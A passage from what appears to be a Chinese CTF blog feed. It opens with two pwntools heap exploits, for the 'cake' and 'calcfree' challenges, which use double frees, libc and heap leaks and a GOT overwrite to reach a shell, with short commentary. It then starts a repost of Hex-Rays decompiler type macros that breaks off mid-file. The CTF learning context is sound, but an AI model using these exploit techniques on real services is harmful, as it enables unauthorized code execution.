class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./cake'</span>)</span><br><span class="line">shop_addr = <span class="number">0x6030E0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make</span><span class="params">(name, price)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"M"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Price&gt; "</span>, str(price))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wait_c</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"W"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serve</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"S"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inspect</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"I"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>, str(index))</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    make(<span class="string">"name1"</span>, <span class="number">32</span>)</span><br><span class="line">    make(<span class="string">"name2"</span>, <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    serve(<span class="number">0</span>)</span><br><span class="line">    serve(<span class="number">1</span>)</span><br><span class="line">    serve(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    make(<span class="string">"name11"</span>, shop_addr<span class="number">-8</span>)</span><br><span class="line">    make(<span class="string">"name22"</span>, <span class="number">0</span>)</span><br><span class="line">    make(<span class="string">"name11"</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    make(p64(elf.got[<span class="string">'free'</span>]), shop_addr - <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    inspect(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'sold for $'</span>)</span><br><span class="line">    free_addr = int(p.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">    sys_addr = free_addr + libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">    one_gadget = free_addr + <span class="number">0xf1147</span> - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    serve(<span class="number">2</span>)</span><br><span class="line">    serve(<span class="number">3</span>)</span><br><span class="line">    serve(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    make(<span class="string">"name11"</span>, shop_addr - <span class="number">8</span>)</span><br><span class="line">    make(<span class="string">"name22"</span>, u64(<span class="string">'/bin/sh\x00'</span>))</span><br><span class="line">    make(<span class="string">"name11"</span>, <span class="number">0</span>)</span><br><span class="line">    make(p64(<span class="number">0</span>), shop_addr<span class="number">-8</span>)</span><br><span class="line">    make(p64(elf.got[<span class="string">'free'</span>]), one_gadget)</span><br><span class="line">    serve(<span class="number">7</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="calcfree">calcfree</span></h3><p>逆波兰式计算器，搞了很久才搞懂这个程序在干嘛，但是真的想好怎么利用我觉得是挺难的。首先程序本身提醒你必须想办法malloc出来一个东西才能避免double free，但是再一次的时候就得想办法realloc才能避免进一步的double free退出程序，这时候就会发现input的内容仍然是之前定义的函数的ops数组，此时就可以控制run_op的流程了，能利用的明显是printf(“%s”, f-&gt;name)，可以泄露堆地址和libc，泄露堆地址的作用是之后布局内存让memcpy可以写free_got,这个真心想了很久，还需要多训练这种能控制堆内存的内容且知道地址时的布局内存的能力。</p><h4><span id="writeup">writeup</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.7'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整个题最坑的是在调试的时候才发现function[]里的指针指的内容只有0x10大小，才能肯定好对定义好的f的利用</span></span><br><span class="line">p = remote(<span class="string">'ubuntu'</span>, <span class="number">10001</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">': first 7 + + + + + + +'</span>) <span class="comment"># 这里make的原因是为了之后避免double free</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">': f 7 + + + + + + +'</span>.rjust(<span class="number">0x70</span>, <span class="string">' '</span>)) <span class="comment"># 这里的坑是想要把f的ops定义在这里，但是同时会修改输入，所以会有参数过少的问题</span></span><br><span class="line">function_base = <span class="number">0x601C60</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 从这里开始能够控制run f，开始构造leak info</span></span><br><span class="line">payload = <span class="string">': first 8 + + + + + + + + f'</span>.ljust(<span class="number">0x20</span>, <span class="string">' '</span>) <span class="comment"># 开始利用，run f被控制，用来泄露heap和libc，泄露heap是因为需要写堆才能实现write everywhere anything</span></span><br><span class="line">payload += p64(<span class="number">7</span>) + p64(elf.got[<span class="string">'__libc_start_main'</span>]) <span class="comment"># 第一个是 op-&gt;t, 第二个是op-&gt;func_t</span></span><br><span class="line">payload += p64(<span class="number">6</span>) + p64(function_base+<span class="number">0x10</span>) <span class="comment"># 打印得是 elf.got['__libc_start_main']的内容</span></span><br><span class="line">payload += p64(<span class="number">6</span>) + p64(function_base+<span class="number">0x08</span>) <span class="comment"># 打印 funcion_base[0]的内容指向字符串，即 fun_a 的 name 地址，应为第三个堆块，与heap——base的距离是0xb0</span></span><br><span class="line">payload += p64(<span class="number">7</span>) + p64(elf.got[<span class="string">'free'</span>])</span><br><span class="line">payload += p64(<span class="number">5</span>) </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"Invalid operation"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Running "</span>)</span><br><span class="line">libc_start_addr = u64(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Running "</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x170</span></span><br><span class="line">sys_addr = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'__libc_start_main'</span>] + libc_start_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line"><span class="keyword">print</span> hex(sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造写到elf.got['free']里，可以从elf.got['free']的上面开始覆盖</span></span><br><span class="line"><span class="comment"># 发现只要system("/bin/sh f")一样也可以拿shell</span></span><br><span class="line">payload = <span class="string">'/bin/sh f'</span>.ljust(<span class="number">0x10</span>, <span class="string">'\x00'</span>) <span class="comment"># 这里是 heap_base + 0x10</span></span><br><span class="line">payload += p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(function_base+<span class="number">0x10</span>) + p64(elf.got[<span class="string">'free'</span>]<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(function_base+<span class="number">0x10</span>) + p64(heap_base+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">7</span>) + p64(heap_base+<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">7</span>) + p64(heap_base+<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载:IDA代码类型转换</title>
      <link href="/2019/04/05/%E8%BD%AC%E8%BD%BD-IDA%E4%BB%A3%E7%A0%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/"/>
      <url>/2019/04/05/%E8%BD%AC%E8%BD%BD-IDA%E4%BB%A3%E7%A0%81%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>IDA反编译出来的代码时长带有一些自己定义的宏，转载一篇记录在这有需要就查一下。原文链接在这 <a href="https://www.cnblogs.com/goodhacker/p/7692443.html" target="_blank" rel="noopener">ida反编译代码类型转换参考</a></p></blockquote><a id="more"></a><pre><span style="color: #008080;">  1</span> <span style="color: #008000;">/*</span><span style="color: #008080;">  2</span> <span style="color: #008080;">  3</span> <span style="color: #008000;">   This file contains definitions used by the Hex-Rays decompiler output.</span><span style="color: #008080;">  4</span> <span style="color: #008000;">   It has type definitions and convenience macros to make the</span><span style="color: #008080;">  5</span> <span style="color: #008000;">   output more readable.</span><span style="color: #008080;">  6</span> <span style="color: #008080;">  7</span> <span style="color: #008000;">   Copyright (c) 2007-2011 Hex-Rays</span><span style="color: #008080;">  8</span> <span style="color: #008080;">  9</span> <span style="color: #008000;">*/</span><span style="color: #008080;"> 10</span> <span style="color: #008080;"> 11</span> <span style="color: #0000ff;">#if</span> defined(__GNUC__)<span style="color: #008080;"> 12</span>   typedef          <span style="color: #0000ff;">long</span> <span style="color: #0000ff;">long</span><span style="color: #000000;"> ll;</span><span style="color: #008080;"> 13</span>   typedef unsigned <span style="color: #0000ff;">long</span> <span style="color: #0000ff;">long</span><span style="color: #000000;"> ull;</span><span style="color: #008080;"> 14</span>   <span style="color: #0000ff;">#define</span> __int64 long long<span style="color: #008080;"> 15</span>   <span style="color: #0000ff;">#define</span> __int32 int<span style="color: #008080;"> 16</span>   <span style="color: #0000ff;">#define</span> __int16 short<span style="color: #008080;"> 17</span>   <span style="color: #0000ff;">#define</span> __int8  char<span style="color: #008080;"> 18</span>   <span style="color: #0000ff;">#define</span> MAKELL(num) num ## LL<span style="color: #008080;"> 19</span>   <span style="color: #0000ff;">#define</span> FMT_64 "ll"<span style="color: #008080;"> 20</span> <span style="color: #0000ff;">#elif</span> defined(_MSC_VER)<span style="color: #008080;"> 21</span> <span style="color: #000000;">  typedef          __int64 ll;</span><span style="color: #008080;"> 22</span> <span style="color: #000000;">  typedef unsigned __int64 ull;</span><span style="color: #008080;"> 23</span>   <span style="color: #0000ff;">#define</span> MAKELL(num) num ## i64<span style="color: #008080;"> 24</span>   <span style="color: #0000ff;">#define</span> FMT_64 "I64"<span style="color: #008080;"> 25</span> <span style="color: #0000ff;">#elif</span> defined (__BORLANDC__)<span style="color: #008080;"> 26</span> <span style="color: #000000;">  typedef          __int64 ll;</span><span style="color: #008080;"> 27</span> <span style="color: #000000;">  typedef unsigned __int64 ull;</span><span style="color: #008080;"> 28</span>   <span style="color: #0000ff;">#define</span> MAKELL(num) num ## i64<span style="color: #008080;"> 29</span>   <span style="color: #0000ff;">#define</span> FMT_64 "L"<span style="color: #008080;"> 30</span> <span style="color: #0000ff;">#else</span><span style="color: #008080;"> 31</span>   <span style="color: #0000ff;">#error</span> "unknown compiler"<span style="color: #008080;"> 32</span> <span style="color: #0000ff;">#endif</span><span style="color: #008080;"> 33</span> typedef unsigned <span style="color: #0000ff;">int</span> <span style="color: #0000ff;">uint</span><span style="color: #000000;">;</span><span style="color: #008080;"> 34</span> typedef unsigned <span style="color: #0000ff;">char</span><span style="color: #000000;"> uchar;</span><span style="color: #008080;"> 35</span> typedef unsigned <span style="color: #0000ff;">short</span> <span style="color: #0000ff;">ushort</span><span style="color: #000000;">;</span><span style="color: #008080;"> 36</span> typedef unsigned <span style="color: #0000ff;">long</span> <span style="color: #0000ff;">ulong</span><span style="color: #000000;">;</span><span style="color: #008080;"> 37</span> <span style="color: #008080;"> 38</span> typedef          <span style="color: #0000ff;">char</span><span style="color: #000000;">   int8;</span><span style="color: #008080;"> 39</span> typedef   signed <span style="color: #0000ff;">char</span><span style="color: #000000;">   sint8;</span><span style="color: #008080;"> 40</span> typedef unsigned <span style="color: #0000ff;">char</span><span style="color: #000000;">   uint8;</span><span style="color: #008080;"> 41</span> typedef          <span style="color: #0000ff;">short</span><span style="color: #000000;">  int16;</span><span style="color: #008080;"> 42</span> typedef   signed <span style="color: #0000ff;">short</span><span style="color: #000000;">  sint16;</span><span style="color: #008080;"> 43</span> typedef unsigned <span style="color: #0000ff;">short</span><span style="color: #000000;">  uint16;</span><span style="color: #008080;"> 44</span> typedef          <span style="color: #0000ff;">int</span><span style="color: #000000;">    int32;</span><span style="color: #008080;"> 45</span> typedef   signed <span style="color: #0000ff;">int</span><span style="color: #000000;">    sint32;</span><span style="color: #008080;"> 46</span> typedef unsigned <span style="color: #0000ff;">int</span><span style="color: #000000;">    uint32;</span><span style="color: #008080;"> 47</span> <span style="color: #000000;">typedef ll              int64;</span><span style="color: #008080;"> 48</span> <span style="color: #000000;">typedef ll              sint64;</span><span style="color: #008080;"> 49</span> <span style="color: #000000;">typedef ull             uint64;</span><span style="color: #008080;"> 50</span> <span style="color: #008080;"> 51</span> <span style="color: #008000;">//</span><span style="color: #008000;"> Partially defined types:</span><span style="color: #008080;"> 52</span> <span style="color: #0000ff;">#define</span> _BYTE  uint8<span style="color: #008080;"> 53</span> <span style="color: #0000ff;">#define</span> _WORD  uint16<span style="color: #008080;"> 54</span> <span style="color: #0000ff;">#define</span> _DWORD uint32<span style="color: #008080;"> 55</span> <span style="color: #0000ff;">#define</span> _QWORD uint64<span style="color: #008080;"> 56</span> <span style="color: #0000ff;">#if</span> !defined(_MSC_VER)<span style="color: #008080;"> 57</span> <span style="color: #0000ff;">#define</span> _LONGLONG __int128<span style="color: #008080;"> 58</span> <span style="color: #0000ff;">#endif</span><span style="color: #008080;"> 59</span> <span style="color: #008080;"> 60</span> <span style="color: #000000;">#ifndef _WINDOWS_</span><span style="color: #008080;"> 61</span> <span style="color: #000000;">typedef int8 BYTE;</span><span style="color: #008080;"> 62</span> <span style="color: #000000;">typedef int16 WORD;</span><span style="color: #008080;"> 63</span> <span style="color: #000000;">typedef int32 DWORD;</span><span style="color: #008080;"> 64</span> <span style="color: #000000;">typedef int32 LONG;</span><span style="color: #008080;"> 65</span> <span style="color: #0000ff;">#endif</span><span style="color: #008080;"> 66</span> <span style="color: #000000;">typedef int64 QWORD;</span><span style="color: #008080;"> 67</span> <span style="color: #000000;">#ifndef __cplusplus</span><span style="color: #008080;"> 68</span> typedef <span style="color: #0000ff;">int</span> <span style="color: #0000ff;">bool</span>;       <span style="color: #008000;">//</span><span style="color: #008000;"> we want to use bool in our C programs</span><span style="color: #008080;"> 69</span> <span style="color: #0000ff;">#endif</span><span style="color: #008080;"> 70</span> <span style="color: #008080;"> 71</span> <span style="color: #008000;">//</span><span style="color: #008000;"> Some convenience macros to make partial accesses nicer</span><span style="color: #008080;"> 72</span> <span style="color: #008000;">//</span><span style="color: #008000;"> first unsigned macros:</span><span style="color: #008080;"> 73</span> <span style="color: #0000ff;">#define</span> LOBYTE(x)   (*((_BYTE*)&amp;(x)))   <span style="color: #008000;">//</span><span style="color: #008000;"> low byte</span><span style="color: #008080;"> 74</span> <span style="color: #0000ff;">#define</span> LOWORD(x)   (*((_WORD*)&amp;(x)))   <span style="color: #008000;">//</span><span style="color: #008000;"> low word</span><span style="color: #008080;"> 75</span> <span style="color: #0000ff;">#define</span> LODWORD(x)  (*((_DWORD*)&amp;(x)))  <span style="color: #008000;">//</span><span style="color: #008000;"> low dword</span><span style="color: #008080;"> 76</span> <span style="color: #0000ff;">#define</span> HIBYTE(x)   (*((_BYTE*)&amp;(x)+1))<span style="color: #008080;"> 77</span> <span style="color: #0000ff;">#define</span> HIWORD(x)   (*((_WORD*)&amp;(x)+1))<span style="color: #008080;"> 78</span> <span style="color: #0000ff;">#define</span> HIDWORD(x)  (*((_DWORD*)&amp;(x)+1))<span style="color: #008080;"> 79</span> <span style="color: #0000ff;">#define</span> BYTEn(x, n)   (*((_BYTE*)&amp;(x)+n))<span style="color: #008080;"> 80</span> <span style="color: #0000ff;">#define</span> WORDn(x, n)   (*((_WORD*)&amp;(x)+n))<span style="color: #008080;"> 81</span> <span style="color: #0000ff;">#define</span> BYTE1(x)   BYTEn(x,  1)         <span style="color: #008000;">//</span><span style="color: #008000;"> byte 1 (counting from 0)</span><span style="color: #008080;"> 82</span> <span style="color: #0000ff;">#define</span> BYTE2(x)   BYTEn(x,  2)<span style="color: #008080;"> 83</span> <span style="color: #0000ff;">#define</span> BYTE3(x)   BYTEn(x,  3)<span style="color: #008080;"> 84</span> <span style="color: #0000ff;">#define</span> BYTE4(x)   BYTEn(x,  4)<span style="color: #008080;"> 85</span> <span style="color: #0000ff;">#define</span> BYTE5(x)   BYTEn(x,  5)<span style="color: #008080;"> 86</span> <span style="color: #0000ff;">#define</span> BYTE6(x)   BYTEn(x,  6)<span style="color: #008080;"> 87</span> <span style="color: #0000ff;">#define</span> BYTE7(x)   BYTEn(x,  7)<span style="color: #008080;"> 88</span> <span style="color: #0000ff;">#define</span> BYTE8(x)   BYTEn(x,  8)<span style="color: #008080;"> 89</span> <span style="color: #0000ff;">#define</span> BYTE9(x)   BYTEn(x,  9)<span style="color: #008080;"> 90</span> <span style="color: #0000ff;">#define</span> BYTE10(x)  BYTEn(x, 10)<span style="color: #008080;"> 91</span> <span style="color: #0000ff;">#define</span> BYTE11(x)  BYTEn(x, 11)<span style="color: #008080;"> 92</span> <span style="color: #0000ff;">#define</span> BYTE12(x)  BYTEn(x, 12)<span style="color: #008080;"> 93</span> <span style="color: #0000ff;">#define</span> BYTE13(x)  BYTEn(x, 13)<span style="color: #008080;"> 94</span> <span style="color: #0000ff;">#define</span> BYTE14(x)  BYTEn(x, 14)<span style="color: #008080;"> 95</span> <span style="color: #0000ff;">#define</span> BYTE15(x)  BYTEn(x, 15)<span style="color: #008080;"> 96</span> <span style="color: #0000ff;">#define</span> WORD1(x)   WORDn(x,  1)<span style="color: #008080;"> 97</span> <span style="color: #0000ff;">#define</span> WORD2(x)   WORDn(x,  2)         <span style="color: #008000;">//</span><span style="color: #008000;"> third word of the object, unsigned</span><span style="color: #008080;"> 98</span> <span style="color: #0000ff;">#define</span> WORD3(x)   WORDn(x,  3)<span style="color: #008080;"> 99</span> <span style="color: #0000ff;">#define</span> WORD4(x)   WORDn(x,  4)<span style="color: #008080;">100</span> <span style="color: #0000ff;">#define</span> WORD5(x)   WORDn(x,  5)<span style="color: #008080;">101</span> <span style="color: #0000ff;">#define</span> WORD6(x)   WORDn(x,  6)<span style="color: #008080;">102</span> <span style="color: #0000ff;">#define</span> WORD7(x)   WORDn(x,  7)<span style="color: #008080;">103</span> <span style="color: #008080;">104</span> <span style="color: #008000;">//</span><span style="color: #008000;"> now signed macros (the same but with sign extension)</span><span style="color: #008080;">105</span> <span style="color: #0000ff;">#define</span> SLOBYTE(x)   (*((int8*)&amp;(x)))<span style="color: #008080;">106</span> <span style="color: #0000ff;">#define</span> SLOWORD(x)   (*((int16*)&amp;(x)))<span style="color: #008080;">107</span> <span style="color: #0000ff;">#define</span> SLODWORD(x)  (*((int32*)&amp;(x)))<span style="color: #008080;">108</span> <span style="color: #0000ff;">#define</span> SHIBYTE(x)   (*((int8*)&amp;(x)+1))<span style="color: #008080;">109</span> <span style="color: #0000ff;">#define</span> SHIWORD(x)   (*((int16*)&amp;(x)+1))<span style="color: #008080;">110</span> <span style="color: #0000ff;">#define</span> SHIDWORD(x)  (*((int32*)&amp;(x)+1))<span style="color: #008080;">111</span> <span style="color: #0000ff;">#define</span> SBYTEn(x, n)   (*((int8*)&amp;(x)+n))<span style="color: #008080;">112</span> <span style="color: #0000ff;">#define</span> SWORDn(x, n)   (*((int16*)&amp;(x)+n))<span style="color: #008080;">113</span> <span style="color: #0000ff;">#define</span> SBYTE1(x)   SBYTEn(x,  1)<span style="color: #008080;">114</span> <span style="color: #0000ff;">#define</span> SBYTE2(x)   SBYTEn(x,  2)<span style="color: #008080;">115</span> <span style="color: #0000ff;">#define</span> SBYTE3(x)   SBYTEn(x,  3)<span style="color: #008080;">116</span> <span style="color: #0000ff;">#define</span> SBYTE4(x)   SBYTEn(x,  4)<span style="color: #008080;">117</span> <span style="color: #0000ff;">#define</span> SBYTE5(x)   SBYTEn(x,  5)<span style="color: #008080;">118</span> <span style="color: #0000ff;">#define</span> SBYTE6(x)   SBYTEn(x,  6)<span style="color: #008080;">119</span> <span style="color: #0000ff;">#define</span> SBYTE7(x)   SBYTEn(x,  7)<span style="color: #008080;">120</span> <span style="color: #0000ff;">#define</span> SBYTE8(x)   SBYTEn(x,  8)<span style="color: #008080;">121</span> <span style="color: #0000ff;">#define</span> SBYTE9(x)   SBYTEn(x,  9)<span style="color: #008080;">122</span> <span style="color: #0000ff;">#define</span> SBYTE10(x)  SBYTEn(x, 10)<span style="color: #008080;">123</span> <span style="color: #0000ff;">#define</span> SBYTE11(x)  SBYTEn(x, 11)<span style="color: #008080;">124</span> <span style="color: #0000ff;">#define</span> SBYTE12(x)  SBYTEn(x, 12)<span style="color: #008080;">125</span> <span style="color: #0000ff;">#define</span> SBYTE13(x)  SBYTEn(x, 13)<span style="color: #008080;">126</span> <span style="color: #0000ff;">#define</span> SBYTE14(x)  SBYTEn(x, 14)<span style="color: #008080;">127</span> <span style="color: #0000ff;">#define</span> SBYTE15(x)  SBYTEn(x, 15)<span style="color: #008080;">128</span> <span style="color: #0000ff;">#define</span> SWORD1(x)   SWORDn(x,  1)<span style="color: #008080;">129</span> <span style="color: #0000ff;">#define</span> SWORD2(x)   SWORDn(x,  2)<span style="color: #008080;">130</span> <span style="color: #0000ff;">#define</span> SWORD3(x)   SWORDn(x,  3)<span style="color: #008080;">131</span> <span style="color: #0000ff;">#define</span> SWORD4(x)   SWORDn(x,  4)<span style="color: #008080;">132</span> <span style="color: #0000ff;">#define</span> SWORD5(x)   SWORDn(x,  5)<span style="color: #008080;">133</span> <span style="color: #0000ff;">#define</span> SWORD6(x)   SWORDn(x,  6)<span style="color: #008080;">134</span> <span style="color: #0000ff;">#define</span> SWORD7(x)   SWORDn(x,  7)<span style="color: #008080;">135</span> <span style="color: #008080;">136</span> <span style="color: #008080;">137</span> <span style="color: #008000;">//</span><span style="color: #008000;"> Helper functions to represent some assembly instructions.</span><span style="color: #008080;">138</span> <span style="color: #008080;">139</span> <span style="color: #000000;">#ifdef __cplusplus</span><span style="color: #008080;">140</span> <span style="color: #008080;">141</span> <span style="color: #008000;">//</span><span style="color: #008000;"> Fill memory block with an integer value</span><span style="color: #008080;">142</span> inline <span style="color: #0000ff;">void</span> memset32(<span style="color: #0000ff;">void</span> *ptr, uint32 value, <span style="color: #0000ff;">int</span><span style="color: #000000;"> count)</span><span style="color: #008080;">143</span> <span style="color: #000000;">{</span><span style="color: #008080;">144</span>   uint32 *p = (uint32 *<span style="color: #000000;">)ptr;</span><span style="color: #008080;">145</span>   <span style="color: #0000ff;">for</span> ( <span style="color: #0000ff;">int</span> i=<span style="color: #800080;">0</span>; i &lt; count; i++<span style="color: #000000;"> )</span><span style="color: #008080;">146</span>     *p++ =<span style="color: #000000;"> value;</span><span style="color: #008080;">147</span> <span style="color: #000000;">}</span><span style="color: #008080;">148</span> <span style="color: #008080;">149</span> <span style="color: #008000;">//</span><span style="color: #008000;"> Generate a reference to pair of operands</span><span style="color: #008080;">150</span> template&lt;<span style="color: #0000ff;">class</span> T&gt;  int16 __PAIR__( int8  high, T low) { <span style="color: #0000ff;">return</span> ((( int16)high) &lt;&lt; <span style="color: #0000ff;">sizeof</span>(high)*<span style="color: #800080;">8</span>) |<span style="color: #000000;"> uint8(low); }</span><span style="color: #008080;">151</span> template&lt;<span style="color: #0000ff;">class</span> T&gt;  int32 __PAIR__( int16 high, T low) { <span style="color: #0000ff;">return</span> ((( int32)high) &lt;&lt; <span style="color: #0000ff;">sizeof</span>(high)*<span style="color: #800080;">8</span>) |<span style="color: #000000;"> uint16(low); }</span><span style="color: #008080;">152</span> template&lt;<span style="color: #0000ff;">class</span> T&gt;  int64 __PAIR__( int32 high, T low) { <span style="color: #0000ff;">return</span> ((( int64)high) &lt;&lt; <span style="color: #0000ff;">sizeof</span>(high)*<span style="color: #800080;">8</span>) |<span style="color: #000000;"> uint32(low); }</span><span style="color: #008080;">153</span> template&lt;<span style="color: #0000ff;">class</span> T&gt; uint16 __PAIR__(uint8  high, T low) { <span style="color: #0000ff;">return</span> (((uint16)high) &lt;&lt; <span style="color: #0000ff;">sizeof</span>(high)*<span style="color: #800080;">8</span>) |<span style="color: #000000;"> uint8(low); }</span><span style="color: #008080;">154</span> template&lt;<span style="color: #0000ff;">class</span> T&gt; uint32 __PAIR__(uint16 high, T low) { <span style="color: #0000ff;">return</span> (((uint32)high) &lt;&lt; <span style="color: #0000ff;">sizeof</span>(high)*<span style="color: #800080;">8</span>) |<span style="color: #000000;"> uint16(low); }</span><span style="color: #008080;">155</span> template&lt;<span style="color: #0000ff;">class</span> T&gt; uint64 __PAIR__(uint32 high, T low) { <span style="color: #0000ff;">return</span> (((uint64)high) &lt;&lt; <span style="color: #0000ff;">sizeof</span>(high)*<span style="color: #800080;">8</span>) |<span style="color: #000000;"> uint32(low); }</span><span style="color: #008080;">156</span> <span style="color: #008080;">157</span> <span style="color: #008000;">//</span><span style="color: #008000;"> rotate left</span><span style="color: #008080;">158</span> template&lt;<span style="color: #0000ff;">class</span> T&gt; T __ROL__(T value, <span style="color: #0000ff;">uint</span><span style="color: #000000;"> count)</span><span style="color: #008080;">159</span> <span style="color: #000000;">{</span><span style="color: #008080;">160</span>   <span style="color: #0000ff;">const</span> <span style="color: #0000ff;">uint</span> nbits = <span style="color: #0000ff;">sizeof</span>(T) * <span style="color: #800080;">8</span><span style="color: #000000;">;</span><span style="color: #008080;">161</span>   count %=<span style="color: #000000;"> nbits;</span><span style="color: #008080;">162</span> <span style="color: #008080;">163</span>   T high = value &gt;&gt; (nbits -<span style="color: #000000;"> count);</span><span style="color: #008080;">164</span>   value &lt;&lt;=<span style="color: #000000;"> count;</span><span style="color: #008080;">165</span>   value |=<span style="color: #000000;"> high;</span><span style="color: #008080;">166</span>   <span style="color: #0000ff;">return</span><span style="color: #000000;"> value;</span><span style="color: #008080;">167</span> <span style="color: #000000;">}</span><span style="color: #008080;">168</span> <span style="color: #008080;">169</span> <span style="color: #008000;">//</span><span style="color: #008000;"> rotate right</span><span style="color: #008080;">170</span> template&lt;<span style="color: #0000ff;">class</span> T&gt; T __ROR__(T value, <span style="color: #0000ff;">uint</span><span style="color: #000000;"> count)</span><span style="color: #008080;">171</span> <span style="color: #000000;">{</span><span style="color: #008080;">172</span>   <span style="color: #0000ff;">const</span> <span style="color: #0000ff;">uint</span> nbits = <span style="color: #0000ff;">sizeof</span>(T) * <span style="color: #800080;">8</span><span style="color: #000000;">;</span><span style="color: #008080;">173</span>   count %=<span style="color: #000000;"> nbits;</span><span style="color: #008080;">174</span> <span style="color: #008080;">175</span>   T low = value &lt;&lt; (nbits -<span style="color: #000000;"> count);</span><span style="color: #008080;">176</span>   value &gt;&gt;=<span style="color: #000000;"> count;</span><span style="color: #008080;">177</span>   value |=<span style="color: #000000;"> low;</span><span style="color: #008080;">178</span>   <span style="color: #0000ff;">return</span><span style="color: #000000;"> value;</span><span style="color: #008080;">179</span> <span style="color: #000000;">}</span><span style="color: #008080;">180</span> <span style="color: #008080;">181</span> <span style="color: #008000;">//</span><span style="color: #008000;"> carry flag of left shift</span><span style="color: #008080;">182</span> template&lt;<span style="color: #0000ff;">class</span> T&gt; int8 __MKCSHL__(T value, <span style="color: #0000ff;">uint</span><span style="color: #000000;"> count)</span><span style="color: #008080;">183</span> <span style="color: #000000;">{</span><span style="color: #008080;">184</span>   <span style="color: #0000ff;">const</span> <span style="color: #0000ff;">uint</span> nbits = <span 